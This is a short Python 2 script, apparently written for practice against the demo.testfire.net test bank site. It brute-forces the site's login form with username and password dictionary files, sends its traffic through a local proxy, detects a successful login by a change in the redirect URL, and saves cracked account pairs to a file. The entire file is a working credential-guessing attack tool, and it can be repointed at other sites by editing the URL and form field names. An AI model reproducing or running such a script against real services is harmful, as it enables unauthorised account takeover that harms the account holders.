# -*- coding: utf-8 -*-
import urllib2
import urllib
import re


def brute_force(user, password):

    proxy = urllib2.ProxyHandler({"http":'http://127.0.0.1:8080'})
    opener = urllib2.build_opener(proxy)
    urllib2.install_opener(opener)

    url = "http://demo.testfire.net/bank/login.aspx"
    user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
    headers = {"User-Agent":user_agent,"Content-Type": "application/x-www-form-urlencoded", "Referer": "http://demo.testfire.net/bank/login.aspx"}
    values = {'uid': user, 'passw': password,'btnSubmit':'Login'}
    data = urllib.urlencode(values)
    request = urllib2.Request(url,data,headers)
    response = urllib2.urlopen(request)
    url2 = response.geturl()

    if url2 != url:#因为urllib2 返回的页面如果存在302重定向,返回的页面是重定向之后的页面,所以不能以302状态码来判断是否登录成功,
        #因为重定向之后的页面访问成功是200,不是302;所以以返回的页面是不是发生变化来判断是否是否登录成功。
        print '---- find user:', user, ' with password:',password, '-----'+'\n'
        outFile.write(user + ':' + password + '\n')
    else:
        print '----- error user:', user.replace('\n',''), ' with password:',password.replace('\n','') , '-----'
    return


outFile = open('accounts-cracked.txt', 'w')

if __name__ == '__main__':
    with open('user.dic', 'r') as userline:
        y = userline.readlines()
        with open('pass.dic', 'r') as passline:
            b= passline.readlines()
            for u in y:
                for p in b:
                    brute_force(user=u.replace('\n',''),password=p.replace('\n',''))
outFile.close()
with open('accounts-cracked.txt','r') as text:
    list = text.readlines()
    sum=len(list)

if sum>0:
    print "找到",sum,"个账号密码"
else:
    print "All thread OK,maybe not "
